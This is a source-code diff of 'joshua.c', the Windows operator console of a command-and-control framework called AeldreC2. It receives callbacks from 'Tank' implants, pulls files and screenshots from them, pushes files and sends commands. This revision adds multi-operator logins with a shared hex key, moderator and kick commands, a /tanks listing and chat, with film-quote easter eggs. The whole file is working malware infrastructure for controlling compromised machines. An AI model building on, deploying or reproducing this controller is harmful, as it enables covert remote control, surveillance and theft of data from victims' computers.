@@ -1,15 +1,16 @@
 /*
  * joshua.c  --  AeldreC2 Joshua C2 Controller
  *
- * MDI operator console.  Listens for incoming Tank callbacks.
+ * MDI operator console.  Listens for incoming Tank callbacks and operator
+ * clients (Lightman / Flynn).
  *
- * New in this version:
  *  - Session list panel (left 180px, listbox, double-click to activate)
  *  - File receive state machine: FILE:<n>\n + raw bytes + <<<DONE>>>
- *    Saves to %TEMP%\tank_<tick>.bin, notifies in session output
- *  - put command: GetOpenFileName + remote path input box,
- *    sends "put <path>\n", waits for PUTREADY\n, sends PUTSIZE:<n>\n + bytes
- *  - screenshot command: just sends "screenshot\n"; file arrives via FILE: protocol
+ *  - put command: GetOpenFileName + remote path, PUTREADY/PUTSIZE handshake
+ *  - screenshot command: sends "screenshot\n"; file arrives via FILE: protocol
+ *  - Operator clients: Lightman (CLI) and Flynn (GUI) connect with a shared
+ *    8-digit hex server key; handles are unique; /givemod /removemod /ops
+ *  - Server log / console MDI child: local admin commands always work
  *
  * Build:
  *   wmake -f Makefile.wc joshua
@@ -145,12 +146,17 @@ static int          g_tls_avail  = 0;
 /* ================================================================
  * Session states
  * ================================================================ */
-#define NS_IDLE       0
-#define NS_RESOLVING  1
-#define NS_CONNECTING 2
-#define NS_TLS_SHAKE  3
-#define NS_CONNECTED  4
-#define NS_LISTENING  5
+#define NS_IDLE             0
+#define NS_RESOLVING        1
+#define NS_CONNECTING       2
+#define NS_TLS_SHAKE        3
+#define NS_CONNECTED        4
+#define NS_LISTENING        5
+#define NS_OP_AWAIT_HANDLE  6  /* operator authed, waiting for HANDLE line */
+
+/* Operator client types */
+#define IS_OP_LIGHTMAN 1
+#define IS_OP_FLYNN    2
 
 /* File receive modes */
 #define RECV_TEXT 0
@@ -198,6 +204,13 @@ typedef struct {
     /* Line accumulator */
     char   accum[ACCUM_SZ];
     int    accum_len;
+    /* Operator client (Lightman / Flynn) */
+    int    is_op;          /* IS_OP_LIGHTMAN=1 or IS_OP_FLYNN=2, 0=tank */
+    char   op_handle[64];  /* nom-de-plume */
+    int    op_is_mod;      /* moderator status */
+    int    op_authed;      /* passed key check */
+    /* Local server console (never has a real socket) */
+    int    is_console;
 } JoshSession;
 
 #define MAX_SESSIONS 16
@@ -227,6 +240,10 @@ static HWND g_inp_edit = NULL;
 static char g_inp_buf[MAX_PATH];
 static int  g_inp_ok   = 0;
 
+/* Operator / server key state */
+static char         g_server_key[9];           /* 8 hex digits, set at startup */
+static JoshSession *g_console_sess = NULL;     /* local server log + console */
+
 /* ================================================================
  * Forward declarations
  * ================================================================ */
@@ -241,6 +258,14 @@ static int  tls_client_begin(JoshSession *s);
 static void tls_handshake_feed(JoshSession *s);
 static void tls_decrypt_recv(JoshSession *s, const char *buf, int len);
 static int  tls_encrypt_send(JoshSession *s, const char *data, int dlen);
+static void gen_server_key(void);
+static void log_append(const char *text);
+static void op_send(JoshSession *s, const char *line);
+static void operator_broadcast(const char *text);
+static int  handle_is_unique(const char *handle);
+static int  count_mods(void);
+static void operator_process_cmd(JoshSession *s, const char *line);
+static void local_console_cmd(const char *line);
 static LRESULT CALLBACK FrameProc(HWND, UINT, WPARAM, LPARAM);
 static LRESULT CALLBACK ChildProc(HWND, UINT, WPARAM, LPARAM);
 static LRESULT CALLBACK DlgProc(HWND, UINT, WPARAM, LPARAM);
@@ -279,7 +304,13 @@ static void update_session_list(void)
     for (i = 0; i < MAX_SESSIONS; i++) {
         JoshSession *s = g_sess[i];
         if (!s) continue;
-        if (s->is_tank) {
+        if (s->is_console) {
+            lstrcpy(title, "[Console]");
+        } else if (s->is_op && s->op_authed) {
+            sprintf(title, "%s [%s]",
+                    s->op_handle[0] ? s->op_handle : "?",
+                    s->op_is_mod ? "mod" : "op");
+        } else if (s->is_tank) {
             const char *st;
             if (s->state != NS_CONNECTED) st = " [dc]";
             else if (s->cmd_busy)         st = " [busy]";
@@ -336,6 +367,27 @@ static void session_set_title(JoshSession *s)
 {
     char title[400];
     if (!s) return;
+    if (s->is_console) {
+        SetWindowText(s->hwnd, "Server Log / Console");
+        update_session_list();
+        return;
+    }
+    if (s->is_op) {
+        if (s->op_authed)
+            sprintf(title, "%s: %s [%s]",
+                    s->is_op == IS_OP_LIGHTMAN ? "Lightman" : "Flynn",
+                    s->op_handle[0] ? s->op_handle : "?",
+                    s->op_is_mod ? "mod" : "op");
+        else if (s->state == NS_OP_AWAIT_HANDLE)
+            sprintf(title, "%s [awaiting handle]",
+                    s->is_op == IS_OP_LIGHTMAN ? "Lightman" : "Flynn");
+        else
+            sprintf(title, "%s [auth]",
+                    s->is_op == IS_OP_LIGHTMAN ? "Lightman" : "Flynn");
+        SetWindowText(s->hwnd, title);
+        update_session_list();
+        return;
+    }
     if (s->is_tank) {
         const char *state = s->cmd_busy ? " [busy]" : " [ready]";
         if (s->state != NS_CONNECTED) state = " [disconnected]";
@@ -478,7 +530,8 @@ static void session_process_data(JoshSession *s, const char *buf, int len)
             }
         }
         /* Tank banner */
-        else if (!s->is_tank && strncmp(s->accum, "Tank/1 ", 7) == 0) {
+        else if (!s->is_tank && !s->is_op &&
+                 strncmp(s->accum, "Tank/1 ", 7) == 0) {
             if (parse_tank_banner(s, s->accum)) {
                 char info[512];
                 sprintf(info, "[Tank connected: %s  OS %s]\r\n",
@@ -486,9 +539,104 @@ static void session_process_data(JoshSession *s, const char *buf, int len)
                         s->tank_os);
                 session_append(s, info);
                 session_set_title(s);
+                sprintf(info, "[TANK] %s connected  OS: %s  shell: %s\r\n",
+                        s->tank_host[0] ? s->tank_host : "unknown",
+                        s->tank_os, s->tank_shell);
+                operator_broadcast(info);
+                log_append(info);
             }
         }
-        /* Plain text output */
+        /* Operator (Lightman / Flynn) banner — key auth */
+        else if (!s->is_tank && !s->is_op &&
+                 (strncmp(s->accum, "Lightman/1 ", 11) == 0 ||
+                  strncmp(s->accum, "Flynn/1 ",    8)  == 0)) {
+            const char *kp;
+            int is_light = (strncmp(s->accum, "Lightman/1 ", 11) == 0);
+            s->is_op = is_light ? IS_OP_LIGHTMAN : IS_OP_FLYNN;
+            kp = strstr(s->accum, "key=");
+            if (kp && strncmp(kp + 4, g_server_key, 8) == 0) {
+                s->state = NS_OP_AWAIT_HANDLE;
+                op_send(s, "KEYOK\r\n");
+                session_set_title(s);
+            } else {
+                op_send(s, "AUTHERR\r\n");
+                session_close(s);
+            }
+        }
+        /* Operator: handle registration */
+        else if (s->is_op && !s->op_authed &&
+                 s->state == NS_OP_AWAIT_HANDLE &&
+                 strncmp(s->accum, "HANDLE ", 7) == 0) {
+            char handle[64];
+            int  hlen;
+            strncpy(handle, s->accum + 7, 63);
+            handle[63] = '\0';
+            /* strip trailing newline */
+            hlen = lstrlen(handle);
+            while (hlen > 0 && (handle[hlen-1] == '\n' || handle[hlen-1] == '\r'))
+                handle[--hlen] = '\0';
+            if (!handle_is_unique(handle)) {
+                op_send(s, "HANDLEDUP\r\n");
+            } else {
+                char info[192];
+                int  nmods;
+                strncpy(s->op_handle, handle, 63);
+                s->op_handle[63] = '\0';
+                s->op_authed = 1;
+                s->state     = NS_CONNECTED;
+                /* First authed operator becomes mod automatically */
+                nmods = count_mods();
+                if (nmods == 0) s->op_is_mod = 1;
+                op_send(s, "HANDLEOK\r\n");
+                session_set_title(s);
+                /* Broadcast connect + greeting quote */
+                sprintf(info, "[OP] %s connected (%s)%s\r\n",
+                        s->op_handle,
+                        s->is_op == IS_OP_LIGHTMAN ? "Lightman" : "Flynn",
+                        s->op_is_mod ? " [mod]" : "");
+                operator_broadcast(info);
+                log_append(info);
+                /* Per-client greeting quote to the server log */
+                if (s->is_op == IS_OP_LIGHTMAN) {
+                    static int lq = 0;
+                    const char *quotes[3] = {
+                        "Protovision, I have you now!\r\n",
+                        "Greetings Professor Falken!\r\n",
+                        "A strange game... ...The only winning move is not to play\r\n"
+                    };
+                    log_append(quotes[lq % 3]);
+                    lq++;
+                } else {
+                    static int fq = 0;
+                    const char *quotes[3] = {
+                        "OK CLu, tonight we fix everything in the right hand column\r\n",
+                        "Now that is a big door...\r\n",
+                        "This can't be happening, it only thinks it's happening\r\n"
+                    };
+                    log_append(quotes[fq % 3]);
+                    fq++;
+                }
+            }
+        }
+        /* Operator: active session — commands and chat */
+        else if (s->is_op && s->op_authed) {
+            char line[ACCUM_SZ];
+            int  llen;
+            strncpy(line, s->accum, ACCUM_SZ - 1);
+            line[ACCUM_SZ - 1] = '\0';
+            llen = lstrlen(line);
+            while (llen > 0 && (line[llen-1] == '\n' || line[llen-1] == '\r'))
+                line[--llen] = '\0';
+            if (line[0] == '/') {
+                operator_process_cmd(s, line);
+            } else if (llen > 0) {
+                char chat[ACCUM_SZ + 80];
+                sprintf(chat, "<%s> %s\r\n", s->op_handle, line);
+                operator_broadcast(chat);
+                log_append(chat);
+            }
+        }
+        /* Plain text output (from tanks) */
         else {
             session_append(s, s->accum);
         }
@@ -499,6 +647,12 @@ static void session_process_data(JoshSession *s, const char *buf, int len)
 static void session_close(JoshSession *s)
 {
     if (!s) return;
+    if (s->is_op && s->op_authed) {
+        char info[128];
+        sprintf(info, "[OP] %s disconnected\r\n", s->op_handle);
+        operator_broadcast(info);
+        log_append(info);
+    }
     if (s->dns_task) { WSACancelAsyncRequest(s->dns_task); s->dns_task = NULL; }
     if (s->sock != INVALID_SOCKET) {
         WSAAsyncSelect(s->sock, g_frame, 0, 0);
@@ -721,6 +875,251 @@ static int tls_encrypt_send(JoshSession *s, const char *data, int dlen)
 }
 
 /* ================================================================
+ * Server key generation
+ * ================================================================ */
+static void gen_server_key(void)
+{
+    DWORD seed = GetTickCount() ^ (DWORD)(UINT_PTR)GetModuleHandle(NULL);
+    srand((unsigned int)seed);
+    sprintf(g_server_key, "%04X%04X",
+            (unsigned)(rand() & 0xFFFF),
+            (unsigned)(rand() & 0xFFFF));
+    g_server_key[8] = '\0';
+}
+
+/* ================================================================
+ * Server log helpers
+ * ================================================================ */
+static void log_append(const char *text)
+{
+    HWND out;
+    int  len;
+    if (!g_console_sess || !g_console_sess->hwnd) return;
+    out = GetDlgItem(g_console_sess->hwnd, IDC_OUT);
+    if (!out) return;
+    len = GetWindowTextLength(out);
+    SendMessage(out, EM_SETSEL, (WPARAM)len, (LPARAM)len);
+    SendMessage(out, EM_REPLACESEL, 0, (LPARAM)text);
+}
+
+/* Send a line to an operator's socket (no TLS for ops in this version) */
+static void op_send(JoshSession *s, const char *line)
+{
+    if (!s || s->sock == INVALID_SOCKET) return;
+    send(s->sock, line, lstrlen(line), 0);
+}
+
+static void operator_broadcast(const char *text)
+{
+    int   i;
+    char  line[ACCUM_SZ + 4];
+    int   tlen = lstrlen(text);
+    /* Ensure CRLF termination for the wire */
+    strncpy(line, text, ACCUM_SZ - 2);
+    line[ACCUM_SZ - 2] = '\0';
+    /* Also echo to the local console session window */
+    if (g_console_sess)
+        session_append(g_console_sess, text);
+    for (i = 0; i < MAX_SESSIONS; i++) {
+        JoshSession *s = g_sess[i];
+        if (!s || !s->is_op || !s->op_authed) continue;
+        if (s->state != NS_CONNECTED)         continue;
+        op_send(s, text);
+        /* Also append to the operator's MDI child */
+        session_append(s, text);
+    }
+    (void)tlen;
+}
+
+static int handle_is_unique(const char *handle)
+{
+    int i;
+    for (i = 0; i < MAX_SESSIONS; i++) {
+        JoshSession *s = g_sess[i];
+        if (!s || !s->is_op || !s->op_authed) continue;
+        if (lstrcmpi(s->op_handle, handle) == 0) return 0;
+    }
+    return 1;
+}
+
+static int count_mods(void)
+{
+    int i, n = 0;
+    for (i = 0; i < MAX_SESSIONS; i++) {
+        JoshSession *s = g_sess[i];
+        if (s && s->is_op && s->op_authed && s->op_is_mod) n++;
+    }
+    return n;
+}
+
+/* Find an authed operator by handle (case-insensitive) */
+static JoshSession *find_op(const char *handle)
+{
+    int i;
+    for (i = 0; i < MAX_SESSIONS; i++) {
+        JoshSession *s = g_sess[i];
+        if (s && s->is_op && s->op_authed &&
+            lstrcmpi(s->op_handle, handle) == 0) return s;
+    }
+    return NULL;
+}
+
+/* Process a /command from an operator (s != NULL) or console (s == NULL) */
+static void run_op_command(JoshSession *caller, int is_console_cmd,
+                           const char *line)
+{
+    char reply[256];
+
+    if (strncmp(line, "/givemod ", 9) == 0) {
+        const char   *target_h = line + 9;
+        JoshSession  *t;
+        if (!is_console_cmd && caller && !caller->op_is_mod) {
+            op_send(caller, "ERR You are not a moderator\r\n");
+            return;
+        }
+        t = find_op(target_h);
+        if (!t) {
+            sprintf(reply, "ERR No such operator: %s\r\n", target_h);
+            if (caller) op_send(caller, reply);
+            else        log_append(reply);
+            return;
+        }
+        if (t->op_is_mod) {
+            sprintf(reply, "ERR %s is already a moderator\r\n", target_h);
+            if (caller) op_send(caller, reply);
+            else        log_append(reply);
+            return;
+        }
+        t->op_is_mod = 1;
+        session_set_title(t);
+        sprintf(reply, "[MOD] %s given mod status by %s\r\n",
+                t->op_handle,
+                (is_console_cmd || !caller) ? "console" : caller->op_handle);
+        operator_broadcast(reply);
+        log_append(reply);
+
+    } else if (strncmp(line, "/removemod ", 11) == 0) {
+        const char  *target_h = line + 11;
+        JoshSession *t;
+        if (!is_console_cmd && caller && !caller->op_is_mod) {
+            op_send(caller, "ERR You are not a moderator\r\n");
+            return;
+        }
+        t = find_op(target_h);
+        if (!t) {
+            sprintf(reply, "ERR No such operator: %s\r\n", target_h);
+            if (caller) op_send(caller, reply);
+            else        log_append(reply);
+            return;
+        }
+        if (!t->op_is_mod) {
+            sprintf(reply, "ERR %s is not a moderator\r\n", target_h);
+            if (caller) op_send(caller, reply);
+            else        log_append(reply);
+            return;
+        }
+        if (count_mods() <= 1) {
+            sprintf(reply, "ERR Cannot remove last moderator\r\n");
+            if (caller) op_send(caller, reply);
+            else        log_append(reply);
+            return;
+        }
+        t->op_is_mod = 0;
+        session_set_title(t);
+        sprintf(reply, "[MOD] %s removed from mod by %s\r\n",
+                t->op_handle,
+                (is_console_cmd || !caller) ? "console" : caller->op_handle);
+        operator_broadcast(reply);
+        log_append(reply);
+
+    } else if (strcmp(line, "/ops") == 0) {
+        int   i;
+        char  list[512];
+        int   pos = 0;
+        pos += sprintf(list + pos, "Operators:\r\n");
+        for (i = 0; i < MAX_SESSIONS; i++) {
+            JoshSession *s = g_sess[i];
+            if (!s || !s->is_op || !s->op_authed) continue;
+            pos += sprintf(list + pos, "  %s [%s] (%s)\r\n",
+                           s->op_handle,
+                           s->op_is_mod ? "mod" : "op",
+                           s->is_op == IS_OP_LIGHTMAN ? "lightman" : "flynn");
+            if (pos > 400) { strcat(list, "  ...\r\n"); break; }
+        }
+        if (caller) op_send(caller, list);
+        else        log_append(list);
+
+    } else if (strcmp(line, "/tanks") == 0) {
+        int  i;
+        char list[512];
+        int  pos = 0;
+        pos += sprintf(list + pos, "Tanks:\r\n");
+        for (i = 0; i < MAX_SESSIONS; i++) {
+            JoshSession *s = g_sess[i];
+            if (!s || !s->is_tank) continue;
+            pos += sprintf(list + pos, "  %s  OS: %s\r\n",
+                           s->tank_host[0] ? s->tank_host : "?",
+                           s->tank_os);
+            if (pos > 400) { strcat(list, "  ...\r\n"); break; }
+        }
+        if (caller) op_send(caller, list);
+        else        log_append(list);
+
+    } else if (strncmp(line, "/kick ", 6) == 0) {
+        const char  *target_h = line + 6;
+        JoshSession *t;
+        if (!is_console_cmd && caller && !caller->op_is_mod) {
+            op_send(caller, "ERR You are not a moderator\r\n");
+            return;
+        }
+        t = find_op(target_h);
+        if (!t) {
+            sprintf(reply, "ERR No such operator: %s\r\n", target_h);
+            if (caller) op_send(caller, reply);
+            else        log_append(reply);
+            return;
+        }
+        sprintf(reply, "[OP] %s kicked by %s\r\n",
+                t->op_handle,
+                (is_console_cmd || !caller) ? "console" : caller->op_handle);
+        op_send(t, "KICKED\r\n");
+        session_close(t);
+        operator_broadcast(reply);
+        log_append(reply);
+
+    } else if (strcmp(line, "/key") == 0 && is_console_cmd) {
+        sprintf(reply, "Server key: %s\r\n", g_server_key);
+        log_append(reply);
+
+    } else {
+        sprintf(reply, "ERR Unknown command: %s\r\n", line);
+        if (caller) op_send(caller, reply);
+        else        log_append(reply);
+    }
+}
+
+static void operator_process_cmd(JoshSession *s, const char *line)
+{
+    run_op_command(s, 0, line);
+}
+
+static void local_console_cmd(const char *line)
+{
+    char echoed[ACCUM_SZ + 16];
+    sprintf(echoed, "> %s\r\n", line);
+    log_append(echoed);
+    if (line[0] == '/') {
+        run_op_command(NULL, 1, line);
+    } else {
+        /* Plain console text: broadcast as a server announcement */
+        char ann[ACCUM_SZ + 32];
+        sprintf(ann, "[SERVER] %s\r\n", line);
+        operator_broadcast(ann);
+        log_append(ann);
+    }
+}
+
+/* ================================================================
  * Socket event handler
  * ================================================================ */
 static void handle_socket_event(SOCKET sock, int event, int err)
@@ -761,7 +1160,8 @@ static void handle_socket_event(SOCKET sock, int event, int err)
             tls_handshake_feed(s);
         } else if (s->state == NS_CONNECTED && s->tls) {
             tls_decrypt_recv(s, buf, n);
-        } else if (s->state == NS_CONNECTED) {
+        } else if (s->state == NS_CONNECTED ||
+                   s->state == NS_OP_AWAIT_HANDLE) {
             session_process_data(s, buf, n);
         }
         break;
@@ -781,10 +1181,10 @@ static void handle_socket_event(SOCKET sock, int event, int err)
                        FD_READ | FD_WRITE | FD_CLOSE);
         s->state = NS_CONNECTED;
         session_set_title(s);
-        sprintf(msg, "[Tank connected from %s:%d]\r\n",
+        sprintf(msg, "[connection from %s:%d]\r\n",
                 inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
         session_append(s, msg);
-        /* Restart a sibling listener for the next Tank */
+        /* Restart a sibling listener for the next callback */
         new_session("", s->port, 0, 1);
         break;
     }
@@ -792,7 +1192,11 @@ static void handle_socket_event(SOCKET sock, int event, int err)
     case FD_CLOSE:
         if (s->is_tank)
             session_append(s, "[Tank disconnected]\r\n");
-        else
+        else if (s->is_op && s->op_authed) {
+            char dinfo[128];
+            sprintf(dinfo, "[%s disconnected]\r\n", s->op_handle);
+            session_append(s, dinfo);
+        } else
             session_append(s, "[connection closed]\r\n");
         session_close(s);
         break;
@@ -832,13 +1236,18 @@ static void session_send(JoshSession *s)
     HWND in_wnd;
     char buf[2048];
     int  len;
-    if (!s || s->state != NS_CONNECTED) return;
+    if (!s) return;
     in_wnd = GetDlgItem(s->hwnd, IDC_IN);
     if (!in_wnd) return;
     len = GetWindowText(in_wnd, buf, (int)sizeof(buf) - 3);
     if (len <= 0) return;
-    session_send_cmd(s, buf);
     SetWindowText(in_wnd, "");
+    if (s->is_console) {
+        local_console_cmd(buf);
+        return;
+    }
+    if (s->state != NS_CONNECTED) return;
+    session_send_cmd(s, buf);
 }
 
 /* ================================================================
@@ -1126,31 +1535,42 @@ static LRESULT CALLBACK ChildProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
     case WM_CREATE: {
         CREATESTRUCT    *cs = (CREATESTRUCT *)lp;
         MDICREATESTRUCT *mc = (MDICREATESTRUCT *)cs->lpCreateParams;
-        HFONT hf = (HFONT)GetStockObject(SYSTEM_FIXED_FONT);
+        HFONT hf   = (HFONT)GetStockObject(SYSTEM_FIXED_FONT);
         HWND  out, in, btn;
+        int   show_input;
         s = (JoshSession *)mc->lParam;
         SetWindowLong(hwnd, GWL_USERDATA, (LONG)s);
+        /* Operator read-only view hides input; tanks + console show it */
+        show_input = (s->is_console || s->is_tank || (!s->is_op));
         out = CreateWindow("EDIT","",WS_CHILD|WS_VISIBLE|WS_VSCROLL|
                   ES_MULTILINE|ES_AUTOVSCROLL|ES_READONLY,
                   0,0,100,100,hwnd,(HMENU)IDC_OUT,g_hinst,NULL);
         SendMessage(out,WM_SETFONT,(WPARAM)hf,FALSE);
-        in = CreateWindow("EDIT","",WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,
+        in = CreateWindow("EDIT","",
+                  (show_input ? WS_VISIBLE : 0)|WS_CHILD|WS_BORDER|ES_AUTOHSCROLL,
                   0,0,100,INPUT_H,hwnd,(HMENU)IDC_IN,g_hinst,NULL);
         SendMessage(in,WM_SETFONT,(WPARAM)hf,FALSE);
         if (!g_in_orig)
             g_in_orig=(WNDPROC)SetWindowLong(in,GWL_WNDPROC,(LONG)InputSubclass);
         else
             SetWindowLong(in,GWL_WNDPROC,(LONG)InputSubclass);
-        btn = CreateWindow("BUTTON","Send",WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,
+        btn = CreateWindow("BUTTON",
+                  s->is_console ? "Exec" : "Send",
+                  (show_input ? WS_VISIBLE : 0)|WS_CHILD|BS_PUSHBUTTON,
                   0,0,BTN_W,INPUT_H,hwnd,(HMENU)IDC_SEND,g_hinst,NULL);
         SendMessage(btn,WM_SETFONT,(WPARAM)hf,FALSE);
         return 0;
     }
     case WM_SIZE: {
         int w=LOWORD(lp), h=HIWORD(lp), iw=w-BTN_W-2;
-        MoveWindow(GetDlgItem(hwnd,IDC_OUT),0,0,w,h-INPUT_H-2,TRUE);
-        MoveWindow(GetDlgItem(hwnd,IDC_IN), 0,h-INPUT_H,iw>0?iw:0,INPUT_H,TRUE);
-        MoveWindow(GetDlgItem(hwnd,IDC_SEND),iw>0?iw:0,h-INPUT_H,BTN_W,INPUT_H,TRUE);
+        int has_input = (s && (s->is_console || s->is_tank || (!s->is_op)));
+        if (has_input) {
+            MoveWindow(GetDlgItem(hwnd,IDC_OUT), 0,0,w,h-INPUT_H-2,TRUE);
+            MoveWindow(GetDlgItem(hwnd,IDC_IN),  0,h-INPUT_H,iw>0?iw:0,INPUT_H,TRUE);
+            MoveWindow(GetDlgItem(hwnd,IDC_SEND),iw>0?iw:0,h-INPUT_H,BTN_W,INPUT_H,TRUE);
+        } else {
+            MoveWindow(GetDlgItem(hwnd,IDC_OUT), 0,0,w,h,TRUE);
+        }
         return 0;
     }
     case WM_COMMAND:
@@ -1238,6 +1658,48 @@ static LRESULT CALLBACK FrameProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
                     WS_CHILD|WS_CLIPCHILDREN|WS_VISIBLE,
                     SESS_LIST_W, 0, 0, 0, hwnd, (HMENU)1, g_hinst, &ccs);
 
+        /* Create the local server-log / console pseudo-session */
+        {
+            MDICREATESTRUCT mcs2;
+            JoshSession *cs = (JoshSession *)calloc(1, sizeof(JoshSession));
+            if (cs) {
+                int ci;
+                char startup[256];
+                cs->sock            = INVALID_SOCKET;
+                cs->listen_sock     = INVALID_SOCKET;
+                cs->file_recv_hfile = INVALID_HANDLE_VALUE;
+                cs->recv_mode       = RECV_TEXT;
+                cs->is_console      = 1;
+                cs->state           = NS_CONNECTED;
+                for (ci=0;ci<MAX_SESSIONS;ci++) {
+                    if (!g_sess[ci]) { g_sess[ci]=cs; break; }
+                }
+                if (ci < MAX_SESSIONS) {
+                    g_nsess++;
+                    memset(&mcs2,0,sizeof(mcs2));
+                    mcs2.szClass = "JoshuaChild";
+                    mcs2.szTitle = "Server Log / Console";
+                    mcs2.hOwner  = g_hinst;
+                    mcs2.x = mcs2.y = mcs2.cx = mcs2.cy = CW_USEDEFAULT;
+                    mcs2.style  = WS_VISIBLE;
+                    mcs2.lParam = (LPARAM)cs;
+                    cs->hwnd = (HWND)SendMessage(g_mdi, WM_MDICREATE,
+                                                 0, (LPARAM)&mcs2);
+                    g_console_sess = cs;
+                    sprintf(startup,
+                            "===== AeldreC2 Joshua =====\r\n"
+                            "Server key : %s\r\n"
+                            "Connect with:\r\n"
+                            "  lightman.exe <your-ip> 4444 %s\r\n"
+                            "  flynn.exe    <your-ip> 4444 %s\r\n"
+                            "===========================\r\n",
+                            g_server_key, g_server_key, g_server_key);
+                    log_append(startup);
+                } else {
+                    free(cs);
+                }
+            }
+        }
         new_session("", 4444, 0, 1);
         return 0;
     }
@@ -1433,6 +1895,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
     WSADATA  wsd;
 
     g_hinst = hInst;
+    gen_server_key();
 
     if (WSAStartup(MAKEWORD(1,1), &wsd) != 0) {
         MessageBox(NULL,"WSAStartup failed.","Joshua",MB_OK|MB_ICONSTOP);
